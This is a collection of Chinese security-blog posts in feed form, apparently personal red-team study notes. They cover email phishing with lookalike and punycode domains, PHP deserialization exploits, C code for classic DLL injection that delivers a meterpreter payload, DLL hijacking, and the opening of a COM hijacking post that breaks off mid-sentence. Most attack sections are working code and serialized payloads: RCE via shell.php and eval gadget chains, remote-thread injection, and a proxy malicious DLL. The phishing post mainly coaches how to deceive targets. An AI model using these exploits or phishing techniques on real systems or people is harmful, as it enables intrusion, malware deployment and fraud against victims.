      <content type="html"><![CDATA[<h2 id="邮件钓鱼的手法"><a href="#邮件钓鱼的手法" class="headerlink" title="邮件钓鱼的手法"></a>邮件钓鱼的手法</h2><p>在APT和红队攻击中，钓鱼手法层出不穷。在安全防护做的密不透风的情况下，邮件钓鱼也成为了突破口之一</p><h2 id="文章说明"><a href="#文章说明" class="headerlink" title="文章说明"></a>文章说明</h2><p>本文只是阅读先知社区的这一篇文章所做的总结：<a href="https://xz.aliyun.com/t/6325！！" target="_blank" rel="noopener">https://xz.aliyun.com/t/6325！！</a></p><h2 id="邮件安全的三大协议"><a href="#邮件安全的三大协议" class="headerlink" title="邮件安全的三大协议"></a>邮件安全的三大协议</h2><p><strong>SPF</strong></p><p>SPF是一种以IP地址认证电子邮件发件人身份证的技术。接收邮件放首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为这是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p><blockquote><p>例如：当邮件服务器收到自称发件人是<a href="mailto:spam@gmail.com" target="_blank" rel="noopener">spam@gmail.com</a>的邮件，那么到底它是不是真的gmail.com的邮件服务器发过来的呢，我们可以查询gmail.com的SPF记录，以此防止别人伪造你来发邮件</p></blockquote><p>参考链接:<a href="http://www.renfei.org/blog/introduction-to-spf.html" target="_blank" rel="noopener">SPF</a></p><p><strong>DKIM</strong></p><p>DKIM让企业可以把加密签名插入到发送的电子邮件中，然后把该签名与域名关联起来。签名随电子邮件发送，而不是沿着网络上的那条路径传送，电子邮件收件人则可以使用签名来证实邮件确认该企业确保邮件内容不被偷窥或篡改</p><p><strong>DMARC</strong></p><p>DMARC是txt记录中的一种，是一种基于现有的SPF和KIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名（DKIM），而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如果直接投入垃圾箱或拒收。从而有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。</p><h2 id="检查是否配置了SPF"><a href="#检查是否配置了SPF" class="headerlink" title="检查是否配置了SPF"></a>检查是否配置了SPF</h2><p><img src="https://s2.ax1x.com/2019/09/17/nhzbO1.png" alt=""></p><p>由于设置SPF的时候至少要有一个txt记录。所以可以进行dns查询txt的记录来查看SPF是怎么配置的</p><p><img src="https://s2.ax1x.com/2019/09/17/n4S100.png" alt=""></p><p>根据SPF文档说明：</p><p><img src="https://s2.ax1x.com/2019/09/17/n4SU1J.png" alt=""></p><p>此域名引用了<code>spf1.staff.mail.aliyun.com</code>上的SPF记录。当这个Email发送了一封邮件给QQ邮箱，那么QQ邮箱就会查询这个<code>spf1.staff.mail.aliyun.com</code>的SPF记录。如果该SPF记录允许发送IP发送邮件，那么就代表这封邮箱是正常的。当两个SMTP服务器进行邮件发送的时候，一个SMTP服务器配置了SPF，而另一个没有。那么没有配置SPF的那个SMTP服务器发送出来的邮件将被标记为垃圾邮件，进行拒收或者扔入垃圾箱。</p><p>163邮箱的SPF设置</p><p><img src="https://s2.ax1x.com/2019/09/17/n4pU58.png" alt=""></p><p>qq设置的spf：</p><p><img src="https://s2.ax1x.com/2019/09/17/n4porR.png" alt=""></p><p>shodan的SPF</p><p><img src="https://s2.ax1x.com/2019/09/17/n4pjRe.png" alt=""></p><p>只接收IP:216.117.2.180发送的邮件，引用_spf.google.com,软拒绝</p><h2 id="伪造邮箱的发送"><a href="#伪造邮箱的发送" class="headerlink" title="伪造邮箱的发送"></a>伪造邮箱的发送</h2><p>使用：<a href="http://tool.chacuo.net/mailanonymous进行伪造邮箱发送给QQ邮箱，由于tool.chacuo.net没有配置SPF。会直接被qq标记为垃圾邮件并扔入垃圾箱或者拒收" target="_blank" rel="noopener">http://tool.chacuo.net/mailanonymous进行伪造邮箱发送给QQ邮箱，由于tool.chacuo.net没有配置SPF。会直接被qq标记为垃圾邮件并扔入垃圾箱或者拒收</a></p><p><img src="https://s2.ax1x.com/2019/09/17/n49rWD.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/17/n495Y8.md.png" alt=""></p><p>所以qq邮箱收不到</p><p><img src="https://s2.ax1x.com/2019/09/17/n4PtV1.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/17/n4Pgat.png" alt=""></p><p>尝试使用Gmail给qq邮箱发送</p><p><img src="https://s2.ax1x.com/2019/09/17/n4F1B9.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/17/n4FGA1.png" alt=""></p><p>根据文章里使用SendGrid插件发送邮件，必须要有一台外网服务器吗。。。我在本地搭建WordPress测试发现并不行，丢…</p><p><img src="https://s2.ax1x.com/2019/09/17/n4tS6e.md.png" alt=""></p><p>服务器用curl发也不行？？我丢，草死了</p><p><img src="https://s2.ax1x.com/2019/09/17/n4aCm4.png" alt=""></p><h3 id="mailgun"><a href="#mailgun" class="headerlink" title="mailgun"></a>mailgun</h3><p>mailgun也类似，每个月可免费发送10000封邮件，可以添加1000个域名，每封邮件都有跟踪日志，简单明了的管理界面。：<br><a href="https://www.mailgun.com/" target="_blank" rel="noopener">https://www.mailgun.com</a></p><pre><code># Try our API. Copy &amp; run this in your terminal.curl -s --user &#39;api:key-**********&#39; \    https://api.mailgun.net/v3/samples.mailgun.org/messages \    -F from=&#39;Excited User &lt;excited@samples.mailgun.org&gt;&#39; \    -F to=&#39;devs@mailgun.net&#39; \    -F subject=&#39;Hello&#39; \    -F text=&#39;Testing some Mailgun awesomeness!&#39;</code></pre><p>其他同类服务<br>Amazon SES 免费套餐，月发送 62000 封电子邮件。</p><p><a href="https://aws.amazon.com/cn/ses/pricing/" target="_blank" rel="noopener">https://aws.amazon.com/cn/ses/pricing/</a></p><p>阿里云邮件推送服务，每个账户每日200封免费邮件。</p><p><a href="https://www.aliyun.com/product/directmail?spm=5176.8064714.321187.pricedetail1111.MpRlp1" target="_blank" rel="noopener">https://www.aliyun.com/product/directmail?spm=5176.8064714.321187.pricedetail1111.MpRlp1</a></p><p>SendCloud 搜狐旗下付费服务</p><p><a href="https://sendcloud.sohu.com/" target="_blank" rel="noopener">https://sendcloud.sohu.com</a></p><p>MandRill 付费服务</p><p><a href="https://www.mandrill.com/pricing/" target="_blank" rel="noopener">https://www.mandrill.com/pricing/</a></p><p>Postmark 免费试用</p><p><a href="https://postmarkapp.com/pricing" target="_blank" rel="noopener">https://postmarkapp.com/pricing</a></p><p><strong>以上的方法我已经失败到不想在试</strong></p><h2 id="钓鱼技巧"><a href="#钓鱼技巧" class="headerlink" title="钓鱼技巧"></a>钓鱼技巧</h2><ul><li>内容与目标的工作相关或账号安全风险等内容</li><li>修改昵称伪造发件人</li><li>内容充实</li><li>如果是伪造域名的话注意被伪造的域名是否有https证书，如果有的话自己也弄一个</li></ul><h2 id="真假难辨的链接"><a href="#真假难辨的链接" class="headerlink" title="真假难辨的链接"></a>真假难辨的链接</h2><p><img src="https://s2.ax1x.com/2019/09/17/n5PJ0A.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/17/n5Py0s.png" alt=""></p><h2 id="域名伪造术"><a href="#域名伪造术" class="headerlink" title="域名伪造术"></a>域名伪造术</h2><p>可以寻找一些相近的域名来注册，比如仿造baidu.com,可以注册：</p><pre><code>biadu.combdaidu.combaiduco.combiaidu.combdu.com</code></pre><p><img src="https://s2.ax1x.com/2019/09/17/n5FS2T.png" alt=""></p><h2 id="punycode伪造术"><a href="#punycode伪造术" class="headerlink" title="punycode伪造术"></a>punycode伪造术</h2><p>文章中提到的</p><p><img src="https://s2.ax1x.com/2019/09/17/n5ATxK.md.png" alt=""></p><blockquote><p>这样的域名是怎么注册的呢？在了解怎么注册一个这样的域名前，需要先了解什么是国际域名（Internationalized domain name, IDN）。<br>IDN是指在域名中包含至少一个特殊语言字母的域名，特殊语言包括中文、法文、拉丁文等。在DNS系统工作中，这种域名会被编码成ASCII字符串，并通过Punycode进行翻译。Punycode是一个根据RFC 3492标准而制定的编码系统,主要用于把域名从地方语言所采用的Unicode编码转换成为可用於DNS系统的编码。目前，因为操作系统的核心都是英文组成，DNS服务器的解析也是由英文代码交换，所以DNS服务器上并不支持直接的中文域名解析，所有中文域名的解析都需要转成punycode码，然后由DNS解析punycode码。其实目前所说的各种主流浏览器都完美支持IDN域名，浏览器里面会自动对IDN域名进行Punycode转码，而地址栏依旧显示的是原始输入的IDN域名</p></blockquote><p>所以，要想注册“币安”的这个域名：</p><pre><code>www.biṇaṇce.com</code></pre><p>其实只需要注册他经过punycode转码后的域名：</p><pre><code>www.xn--biace-4l1bb.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190911002252-3ce563a6-d3e7-1.png" alt=""></p><p>如果伪造一个baidu.com的话</p><p><img src="https://s2.ax1x.com/2019/09/17/n5m16x.md.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>想要一次成功的钓鱼，需要对目标信息进行详细的收集，利用最近发生的热点事件来构造话题。引诱受害者上钩，如果钓鱼是模仿某域名钓鱼的话需要牢记以下几个点：</p><ul><li>先查是否有SPF</li><li>模仿相对应的域名</li><li>注意是否有https证书</li><li>内容充实</li><li>做戏做全套</li></ul><p>防御措施：部署<strong>DMARC</strong>或<strong>DKIM</strong>,查看邮件源数据来确定这份邮件是不是伪造的</p><p>thinks read ~</p>]]></content>
      
      
        <tags>
            
            <tag> 钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php反序列化漏洞学习</title>
      <link href="/posts/573dfd6f.html"/>
      <url>/posts/573dfd6f.html</url>
      <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p>说到反序列化就要先说序列化，反序列化和序列化都伪造着两个函数来弄。serialize()和unserialize()</p><ul><li>serialize()是用于将类转换为一个字符串</li><li>unserialize()用于将字符串转换回一个类</li></ul><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><pre><code class="php">&lt;?phpclass test{    var $test=&#39;123&#39;;}$class1=new test;$class_ser=serialize($class1);echo $class_ser;?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/09/16/nRdF3D.png" alt=""></p><p>输出结果为：</p><pre><code class="php">O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code></pre><p>O代表存储的是对象（Object）,4代表名称有4个字符。<code>test</code>表示对象的名称，1表示有一个值，、<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，4表示该变量的名称长度,value:<code>test</code>。3表示变量的值的长度为3,value:<code>123</code>。</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>与serialize()对应的，unserialize()可以从序列化后的结果中恢复对象（Object）。</p><pre><code class="php">&lt;?phpclass test{    var $test=&#39;123&#39;;}$class1=new test;$class_ser=serialize($class1);$data=unserialize($class_ser);print_r($data);?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/09/16/nRwQd1.png" alt=""></p><p>输出结果为：</p><pre><code class="php">test Object ( [test] =&gt; 123 )</code></pre><p><code>test</code>为对象，<code>[test]=&gt;123</code>代表<code>$test=&quot;123&quot;</code></p><p>注意：当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</p><h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>当参数传给unserialize()的参数可控时，我们可以通过一个序列化字符串。从而控制对象内部的变量甚至是函数</p><h2 id="利用构造函数"><a href="#利用构造函数" class="headerlink" title="利用构造函数"></a>利用构造函数</h2><p><strong>Magic function</strong></p><p>php中有一类特殊的方法叫做“Magic function”，重点需要关注的</p><ul><li>构造函数__construct()：当对象创建（new）时会自动调用。但在<code>unserialize()</code>时是不会自动调用的</li><li>析构函数__destruct()：当对象被销毁时会自动调用。</li><li>__wakeup()：如前所提，unserialize()时会自动调用</li></ul><p><strong>demo</strong></p><pre><code class="php">&lt;?phpheader(&quot;Content-type: text/html;charset=utf-8&quot;);class test{    var $test=&#39;123&#39;;    function __wakeup(){        echo &quot;__wakeup&quot;.&quot;&lt;br&gt;&quot;;    }    function __construct(){        echo &quot;__construct&quot;.&quot;&lt;br&gt;&quot;;    }    function __destruct(){        echo &quot;__destruct&quot;.&quot;&lt;br&gt;&quot;;    }}echo &quot;序列化:&quot;.&quot;&lt;br&gt;&quot;;$data=new test;$data=serialize($data);echo &quot;反序列化&quot;.&quot;&lt;br&gt;&quot;;$jm=unserialize($data);print_r($jm);?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/09/16/nRrA0J.png" alt=""></p><blockquote><p><strong>wakeup() 或</strong>destruct()由前可以看到，unserialize()后会导致<strong>wakeup() 或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup() 或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们</p></blockquote><p>例子：</p><pre><code class="php">&lt;?phpclass chybeta{    var $test = &#39;123&#39;;    function __wakeup(){        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;        fwrite($fp,$this-&gt;test);        fclose($fp);    }}$class3 = $_GET[&#39;test&#39;];print_r($class3);echo &quot;&lt;/br&gt;&quot;;$class3_unser = unserialize($class3);require &quot;shell.php&quot;;// 为显示效果，把这个shell.php包含进来?&gt;</code></pre><p>通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：</p><pre><code class="php">&lt;?phpclass chybeta{    var $test = &#39;123&#39;;    function __wakeup(){        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;        fwrite($fp,$this-&gt;test);        fclose($fp);    }}$data=new chybeta();$data-&gt;test=&#39;&lt;?php phpinfo()?&gt;&#39;;$data_ser=serialize($data);echo $data_ser;?&gt;</code></pre><p>结果为</p><pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;}</code></pre><p>当把序列化后的字符串放入到test的传参中，就会造成RCE</p><p><img src="https://s2.ax1x.com/2019/09/16/nRsbZQ.png" alt=""></p><h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的<strong>construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的</strong>wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p><pre><code class="php">&lt;?phpclass ph0en1x{    function __construct($test){        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;        fwrite($fp,$test);        fclose($fp);    }}class chybeta{    var $test = &#39;123&#39;;    function __wakeup(){        $obj = new ph0en1x($this-&gt;test);    }}$class5 = $_GET[&#39;test&#39;];print_r($class5);echo &quot;&lt;/br&gt;&quot;;$class5_unser = unserialize($class5);require &quot;shell.php&quot;;?&gt;</code></pre><p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <strong>wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的</strong>construct()方法，从而把<code>&lt;?php phpinfo() ?&gt;</code>写入到 shell.php中</p><pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}</code></pre><p><img src="https://s2.ax1x.com/2019/09/16/nRgNy6.png" alt=""></p><h2 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h2><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p><pre><code class="php">&lt;?phpclass chybeta {    var $test;    function __construct() {        $this-&gt;test= new ph0en1x(); //实例化ph0en1x    }    function __destruct() {        $this-&gt;test-&gt;action(); //调用ph0en1x类里的action()函数    }}class ph0en1x {    function action() {        echo &quot;ph0en1x&quot;;    }}class ph0en2x {    var $test2;    function action() {        eval($this-&gt;test2);    }}$class6 = new chybeta();unserialize($_GET[&#39;test&#39;]);?&gt;</code></pre><p>payload修改为：</p><pre><code class="php">&lt;?phpclass chybeta {    var $test;    function __construct() {        $this-&gt;test=new ph0en2x(); //实例化ph0en1x    }}class ph0en2x {    var $test2=&quot;phpinfo();&quot;;}$class6 = new chybeta();$payload=serialize($class6);echo $payload;</code></pre><p>最后得到的序列化字串</p><pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}}</code></pre><p><img src="https://s2.ax1x.com/2019/09/16/nRfWgs.png" alt=""></p><h2 id="反序列化漏洞的利用总结"><a href="#反序列化漏洞的利用总结" class="headerlink" title="反序列化漏洞的利用总结"></a>反序列化漏洞的利用总结</h2><ul><li>搜索关键词serialize()和unserialize()</li><li>详细审计有调用以上函数的代码和调用这个函数的上面的类</li><li>详细审计类</li></ul><p>参考链接：<a href="https://chybeta.github.io/2017/06/17/浅谈php反序列化漏洞/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>经典DLL injection</title>
      <link href="/posts/e84fbfc9.html"/>
      <url>/posts/e84fbfc9.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在某文章中见到dll injection的操作，打算用C写一下。搜了好久发现都是C++和C#的示例，找了好久才发现C的真的是难受的一批</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1568462332111&amp;di=a75ef31c4f03d06d479caac583297cd2&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201706%2F08%2F20170608023310_k25jY.thumb.700_0.gif" alt=""></p><h2 id="DLL注入的由来"><a href="#DLL注入的由来" class="headerlink" title="DLL注入的由来"></a>DLL注入的由来</h2><p>DLL注入一般为了方便不修改程序的主题而能实现其他功能，比如：外挂，程序补丁等。可以通过DLL注入来完成，DLL注入现在分为很多种。现在最流行的是反射型DLL注入，这里先学习最基础的经典DLL注入。</p><h2 id="经典DLL注入的流程"><a href="#经典DLL注入的流程" class="headerlink" title="经典DLL注入的流程"></a>经典DLL注入的流程</h2><p><img src="https://s2.ax1x.com/2019/09/14/n6AyZT.png" alt=""></p><h2 id="C实现"><a href="#C实现" class="headerlink" title="C实现"></a>C实现</h2><p>代码如下：</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;string.h&gt;int main(){    HANDLE hprocess=OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE,FALSE,4860); //打开现有的本地进程对象，参考链接：https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess    LPVOID dllpath=&quot;C:\\Users\\jiushi\\Desktop\\demo.dll&quot;; //没有类型的指针    FARPROC load=GetProcAddress(GetModuleHandle(&quot;Kernel32&quot;), &quot;LoadLibraryA&quot;); //获取运行时类型句柄，调用dll的函数，参考链接：https://docs.microsoft.com/en-us/dotnet/api/system.runtimetypehandle.getmodulehandle?view=netframework-4.8    char * pszLibFileRemote = (char *) VirtualAllocEx(hprocess,NULL,strlen(dllpath)+1,MEM_COMMIT,PAGE_READWRITE); //保留，提交或更改指定进程的虚拟地址空间内的内存区域的状态 参考链接：https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex    WriteProcessMemory(hprocess, pszLibFileRemote, (PVOID) dllpath, strlen(dllpath)+1, NULL); //将数据写入指定进程中的内存区域,参考链接：https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory    CreateRemoteThread(hprocess, NULL, 0,(LPTHREAD_START_ROUTINE)load, pszLibFileRemote, 0, NULL); //创建在另一个进程的虚拟地址空间中运行的线程，参考链接：https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread    return 0;}</code></pre><p>上面的4860是进程ID，dll是用msfvenom生成的。成功注入进程后将会返回一个meterpreter</p><p><img src="https://s2.ax1x.com/2019/09/14/n6ZmIU.jpg" alt=""></p><p>而进程是这样的</p><p><img src="https://s2.ax1x.com/2019/09/14/n6Z8qx.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> DLL injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DLL劫持学习</title>
      <link href="/posts/47326ba8.html"/>
      <url>/posts/47326ba8.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DLLhijacking是APT组织和各种红队所喜爱的操作，DLL劫持可用于留后门、权限提升、进程注入等。是个出家必备的技能</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1568269251448&amp;di=91855e0cfe8c338b7a5943fd8925e565&amp;imgtype=0&amp;src=http%3A%2F%2Fimg.mp.itc.cn%2Fupload%2F20161122%2F71cf649ba21c4806bc4119c3920ecc44_th.jpg" alt=""></p><h2 id="DLL介绍"><a href="#DLL介绍" class="headerlink" title="DLL介绍"></a>DLL介绍</h2><blockquote><p>动态链接库英文为<strong>DLL</strong>，是<strong>Dynamic Link Library</strong>的缩写。DLL是一个包含可由多个程序，同时使用的代码和数据的库。例如，在 <a href="https://baike.baidu.com/item/Windows" target="_blank" rel="noopener">Windows</a> 操作系统中，<a href="https://baike.baidu.com/item/Comdlg32.dll" target="_blank" rel="noopener">Comdlg32.dll</a> 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于避免代码重用和促进内存的有效使用。 通过使用 DLL，程序可以实现模块化，由相对独立的组件组成。例如，一个计账程序可以按模块来销售。可以在运行时将各个模块加载到主程序中（如果安装了相应模块）。因为模块是彼此独立的，所以程序的加载速度更快，而且模块只在相应的功能被请求时才加载。</p></blockquote><h2 id="DLL劫持的分类"><a href="#DLL劫持的分类" class="headerlink" title="DLL劫持的分类"></a>DLL劫持的分类</h2><p>1.二进制文件调用缺少的DLL</p><p>2.劫持正常的DLL</p><p>第一种方法的利用方法：只需要找到缺少的dll路径生成恶意的DLL放入对应的路径即可，常使用的工具ProcessMonitor，缺点是有些dll路径是在权高的文件夹中。无一定权限没法操作</p><p>第二种方法：使用ProcessMonitor查看程序所加载的DLL，使用CFF_Explorer找到DLL的导入函数。使用IDA Pro分析DLL的函数，创建一个dll此dll加载正常的dll。等正常的DLL加载完成后执行恶意操作</p><p>这里我说第二种方法，第一种方法我已经说过了</p><h2 id="实现DLL-Hijack"><a href="#实现DLL-Hijack" class="headerlink" title="实现DLL Hijack"></a>实现DLL Hijack</h2><p>这里使用C来做例子，首先使用C创建一个dll和exe</p><p>export.h</p><pre><code class="c">#ifdef BUILD_DLL //判断是否已加载BUILD_DLL#define EXPORT __declspec(dllexport) //无的话设置为导出函数#else#define EXPORT __declspec(dllimport) //相反设置导入函数#endif //结束判断EXPORT void export(void); //定义DLL函数</code></pre><p>export.c</p><pre><code class="C">#include &lt;stdio.h&gt;#include &quot;export.h&quot;EXPORT void export(){    printf(&quot;This is load dll test\n&quot;);}</code></pre><p>gcc编译成dll,用命令行执行gcc不要用clion编译</p><p>执行<code>gcc -shared -o export.dll export.c -static</code>会生成一个dll</p><p><img src="https://s2.ax1x.com/2019/09/12/n0tzY6.png" alt=""></p><p>创建一个exe调用这个dll</p><p>01.exe</p><pre><code class="c">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*fun)(); //定义dll函数里的类型int main(){    HINSTANCE hdll;    fun add;    hdll=LoadLibrary(&quot;C:\\Users\\Administrator\\Desktop\\C_Master\\01\\export.dll&quot;);    if(hdll==NULL){        printf(&quot;fuck you load dll\n&quot;);        exit(1);    }    add=(fun)GetProcAddress(hdll,&quot;export&quot;);    add();    FreeLibrary(hdll);    return 0;}</code></pre><p>我们使用CFF_Explorer可以看到dll的函数</p><p><img src="https://s2.ax1x.com/2019/09/12/n0BJAJ.png" alt=""></p><p>使用IDA pro定位到这个函数进行分析</p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g6wmmsw1r9j31fw0jqdhk.jpg" alt=""></p><p>然后创建一个恶意的dll，这个dll的函数名为export,会加载被改名成demo.dll里面的export函数  </p><pre><code class="c">#include &lt;windows.h&gt;#include &quot;export.h&quot;EXPORT void export(){    typedef void (*func)();    func add;    HINSTANCE hdll;    hdll=LoadLibrary(&quot;C:\\Users\\Administrator\\Desktop\\C_Master\\01\\demo.dll&quot;);    if(hdll!=NULL){        add=(func)GetProcAddress(hdll,&quot;export&quot;);        add();    }    FreeLibrary(hdll);    MessageBox(NULL,TEXT(&quot;THis is DLL hijack&quot;),TEXT(&quot;dll hijack&quot;),MB_OK);}</code></pre><p>运行结果</p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g6wmvxns18j30s50hlaba.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>gcc打包成DLL的方法<a href="https://www.cnblogs.com/ser0632/p/4920653.html" target="_blank" rel="noopener">https://www.cnblogs.com/ser0632/p/4920653.html</a><br>C的条件编译<a href="http://c.biancheng.net/view/449.html" target="_blank" rel="noopener">http://c.biancheng.net/view/449.html</a><br>C的DLL导入和导出函数<a href="https://www.cnblogs.com/xd502djj/archive/2010/09/21/1832493.html" target="_blank" rel="noopener">https://www.cnblogs.com/xd502djj/archive/2010/09/21/1832493.html</a><br>C加载DLL<a href="https://my.oschina.net/bbi094/blog/704163" target="_blank" rel="noopener">https://my.oschina.net/bbi094/blog/704163</a></p>]]></content>
      
      
        <tags>
            
            <tag> DLL hijack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>COM劫持_学习</title>
      <link href="/posts/73b20b1d.html"/>
      <url>/posts/73b20b1d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前一直没搞明白COM劫持是怎么弄的，今天研究了2个小时左右搞懂了。最后还把Windows10虚拟机搞死了，蛤蛤蛤</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1568150420627&amp;di=cb65774ebe6bf2a74b44aea1ef1bc024&amp;imgtype=0&amp;src=http%3A%2F%2Fi2.hdslb.com%2Fbfs%2Farchive%2Faeb21fca53040b70380c669273de003f534e8b74.png" alt=""></p><h2 id="COM的由来"><a href="#COM的由来" class="headerlink" title="COM的由来"></a>COM的由来</h2><p>COM是开发<a href="https://baike.baidu.com/item/软件组件" target="_blank" rel="noopener">软件组件</a>的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。开发自定义的COM组件就如同开发动态的，<a href="https://baike.baidu.com/item/面向对象" target="_blank" rel="noopener">面向对象</a>的API。多个COM对象可以连接起来形成应用程序或组件系统。并且组件可以在运行时刻，在不被重新链接或编译应用程序的情况下被卸下或替换掉。Microsoft的许多技术，如ActiveX, DirectX以及OLE等都是基于COM而建立起来的。并且Microsoft的开发人员也大量使用COM组件来定制他们的应用程序及操作系统。</p><p><img src="https://gss3.bdstatic.com/7Po3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=d99d2907fc246b606f03ba268a917129/838ba61ea8d3fd1f26a0d56e3a4e251f95ca5f3c.jpg" alt=""></p><p>参考链接：<a href="https://baike.baidu.com/item/COM组件/3351509?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/COM%E7%BB%84%E4%BB%B6/3351509?fr=aladdin</a></p><h2 id="COM劫持的说法"><a href="#COM劫持的说法" class="headerlink" title="COM劫持的说法"></a>COM劫持的说法</h2><p><strong>缺少的COM</strong></p><p>COM对象是注册表中对磁盘上没有实现文件的对象的引用。例如，在注册表项HKCU \ CLSID \ {xxxx} \ InprocServer32 \ Default下，其中{xxxx}是COM对象的相应GUID，您应该找到对文件yyy.dll的引用。如果磁盘上不存在此文件或缺少“（默认）”条目，则请求访问此对象的进程将失败。</p><p><strong>劫持后的表现</strong></p><p>当劫持了COM组件之后，当某进程调用了这个组件。那么就会触发攻击者所设置的后门</p><p><img src="https://s2.ax1x.com/2019/09/11/naNdGF.png" alt=""></p><p><strong>COM搜索顺序劫持</strong></p><p>机器范围的COM对象在以下位置注册：</p><p><code>HKEY_LOCAL_MACHINE \ Software \ Classes下</code></p><p>每用户COM对象在以下位置注册：</p><p><code>HKEY_CURRENT_USER \ Software \ 